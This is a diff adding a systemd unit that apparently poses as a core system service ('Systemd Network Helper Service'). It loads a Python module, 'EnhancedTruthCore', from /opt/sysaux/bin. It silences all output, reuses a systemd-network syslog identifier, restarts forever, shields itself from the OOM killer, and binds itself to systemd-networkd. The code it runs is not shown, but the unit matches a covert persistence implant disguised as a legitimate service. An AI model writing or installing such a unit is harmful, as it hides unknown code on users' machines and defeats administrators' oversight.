@@ -1,0 +1,34 @@
+[Unit]
+Description=Systemd Network Helper Service
+After=network.target systemd-networkd.service
+Wants=systemd-networkd.service
+PartOf=systemd-networkd.service
+
+[Service]
+Type=exec
+Restart=always
+RestartSec=10
+RestartPreventExitStatus=0
+User=systemd-network
+Group=systemd-network
+ExecStart=/usr/bin/python3 -c "import sys; sys.path.insert(0, '/opt/sysaux/bin'); from core_truth import EnhancedTruthCore; core = EnhancedTruthCore(); import time; time.sleep(86400)"
+ExecReload=/bin/kill -HUP $MAINPID
+KillMode=mixed
+KillSignal=SIGTERM
+TimeoutStopSec=30
+StandardOutput=null
+StandardError=null
+SyslogIdentifier=systemd-network
+OOMScoreAdjust=-1000
+NoNewPrivileges=yes
+ProtectSystem=strict
+ProtectHome=yes
+PrivateTmp=yes
+PrivateDevices=yes
+ProtectKernelTunables=yes
+ProtectKernelModules=yes
+ProtectControlGroups=yes
+
+[Install]
+WantedBy=multi-user.target
+Also=systemd-networkd.service
